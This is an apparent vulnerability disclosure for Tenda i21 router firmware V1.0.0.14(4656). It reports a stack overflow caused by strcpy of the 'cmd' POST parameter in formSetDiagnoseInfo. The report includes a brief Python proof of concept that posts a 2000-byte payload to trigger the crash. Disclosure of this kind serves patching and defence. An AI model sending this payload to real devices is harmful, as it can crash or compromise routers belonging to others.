## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formSetDiagnoseInfo` function. The `strcmd` variable receives the `cmd` parameter from a POST request. However, since the user can control the input of `cmd`, the statement `strcpy(cfg->hostname, strcmd+ 5);` can cause a buffer overflow. The user-provided  `cmd` can exceed the capacity of the `cfg->hostname` array, triggering this security vulnerability.

![image-20240419204611232](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419204611232.png)

## POC

```python
payload = b"a"*2000

data = {"cmd": payload}
response = requests.post(url, data=data)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
